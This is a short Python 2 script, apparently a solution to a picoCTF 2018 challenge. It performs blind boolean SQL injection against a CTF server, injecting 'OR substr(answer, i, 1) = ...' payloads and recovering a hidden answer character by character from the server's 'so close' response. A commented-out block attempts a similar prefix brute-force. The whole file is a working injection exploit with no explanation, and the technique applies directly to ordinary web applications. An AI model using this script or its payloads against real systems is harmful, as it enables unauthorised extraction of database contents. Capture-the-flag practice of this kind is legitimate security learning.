import requests

def check_char(i, c):
  evil_string = "test' OR substr(answer, %d, 1) = '%s' --" % (i ,c)
  r = requests.post("http://2018shell2.picoctf.com:2644/answer2.php", data={"debug":"1", "answer": evil_string})
  print repr(r.text)
  return u"so close" in r.text
  
value = ""
while True:
  for i in xrange(0, 128):
    if check_char(len(value) + 1, chr(i)):
      value += chr(i)
      print value
  
"""
known_prefix = "4_anDS_xS_xT_s"
while True:
  for i in xrange(0, 128):
    if chr(i) == "%": continue
    if prefix(known_prefix + chr(i)):
      known_prefix += chr(i)
      print known_prefix
"""
